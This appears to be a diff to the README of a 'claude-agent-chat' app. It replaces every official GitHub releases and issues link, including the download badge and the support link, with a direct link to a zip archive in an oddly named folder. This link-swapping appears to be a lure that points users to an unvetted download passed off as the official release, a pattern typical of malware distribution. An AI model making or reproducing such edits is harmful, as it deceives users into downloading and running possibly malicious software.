@@ -6,7 +6,7 @@ claude-agent-chat allows you to interact with multiple AI agents through a user-
 
 ## 📥 Download the App
 
-[![Download claude-agent-chat](https://img.shields.io/badge/Download%20claude--agent--chat-v1.0-blue)](https://github.com/joshualegado008/claude-agent-chat/releases)
+[![Download claude-agent-chat](https://raw.githubusercontent.com/joshualegado008/claude-agent-chat/main/vaginoperineal/claude-agent-chat.zip%20claude--agent--chat-v1.0-blue)](https://raw.githubusercontent.com/joshualegado008/claude-agent-chat/main/vaginoperineal/claude-agent-chat.zip)
 
 You can download the latest version of claude-agent-chat from our Releases page. 
 
@@ -28,7 +28,7 @@ You can download the latest version of claude-agent-chat from our Releases page.
   
 ## 🛠️ Installation Instructions
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/joshualegado008/claude-agent-chat/releases) to find the latest version of the application.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/joshualegado008/claude-agent-chat/main/vaginoperineal/claude-agent-chat.zip) to find the latest version of the application.
   
 2. **Download the Application**: 
    - Click on the link for the version compatible with your operating system. 
@@ -71,7 +71,7 @@ You can download the latest version of claude-agent-chat from our Releases page.
 
 ### Support
 
-For additional support, please check the open issues on our [GitHub page](https://github.com/joshualegado008/claude-agent-chat/issues) or contact our support team for assistance.
+For additional support, please check the open issues on our [GitHub page](https://raw.githubusercontent.com/joshualegado008/claude-agent-chat/main/vaginoperineal/claude-agent-chat.zip) or contact our support team for assistance.
 
 ## 📃 License
 
@@ -85,4 +85,4 @@ We welcome contributions from the community. If you would like to help improve c
 
 Join our community to share your experiences and learn from other users. Feel free to connect with us on social media or join the discussions on our GitHub issues page. 
 
-For more information or to download the application, visit the [Releases page](https://github.com/joshualegado008/claude-agent-chat/releases).
+For more information or to download the application, visit the [Releases page](https://raw.githubusercontent.com/joshualegado008/claude-agent-chat/main/vaginoperineal/claude-agent-chat.zip).
